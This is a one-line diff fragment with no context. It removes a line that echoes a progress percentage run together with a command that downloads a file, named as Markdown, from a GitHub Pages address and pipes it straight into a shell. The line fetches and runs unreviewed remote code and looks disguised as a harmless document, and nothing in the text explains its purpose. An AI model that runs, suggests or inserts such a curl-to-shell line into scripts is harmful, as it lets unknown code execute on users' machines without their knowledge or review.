@@ -1,1 +1,0 @@
-echo Progress: 49.00%curl -L --progress-bar frkns.github.io/fun/BrianWatsonCorpsTheta.md | sh
